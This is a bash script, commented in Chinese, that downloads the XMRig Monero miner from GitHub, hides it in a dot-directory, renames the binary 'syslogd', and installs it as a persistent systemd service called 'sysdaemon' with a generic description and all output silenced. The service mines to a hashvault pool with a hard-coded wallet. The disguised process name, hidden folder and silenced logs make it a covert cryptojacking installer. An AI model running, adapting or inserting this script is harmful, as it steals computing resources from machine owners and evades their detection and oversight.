#!/bin/bash

# 更新并安装必备工具
apt update -y
apt install -y wget tar

# 定义变量
WORK_DIR="/home/ubuntu/.sys_service"
SERVICE_NAME="sysdaemon"
PROCESS_NAME="syslogd"
ARCHIVE_NAME="update-package.tar.gz"
DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz"

# 创建工作目录
mkdir -p $WORK_DIR
cd $WORK_DIR

# 下载文件（带超时15秒，断点续传）
wget -T 15 -c -O $ARCHIVE_NAME $DOWNLOAD_URL

# 解压并重命名目录
tar -zxvf $ARCHIVE_NAME
mv xmrig-6.23.0 miner_files

# 进入重命名目录，重命名主程序并赋权
cd miner_files
mv xmrig $PROCESS_NAME
chmod +x $PROCESS_NAME

# 创建 systemd 服务配置
cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
[Unit]
Description=System Service Daemon
After=network.target

[Service]
ExecStart=$WORK_DIR/miner_files/$PROCESS_NAME --url usa.hashvault.pro:443 --user 474mJh9oy3MQyvC9qRamH3J1ZKUpkhLVuTo2MKp777GvSR1g8STySmfedkUzzQLF8tHRH7NMSiGjnCqkyx4jbTUPGCZsm3o --pass gifiwkrs_zbeen --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
Restart=always
User=ubuntu
WorkingDirectory=$WORK_DIR/miner_files
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# 重新加载 systemd 并启用服务
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME
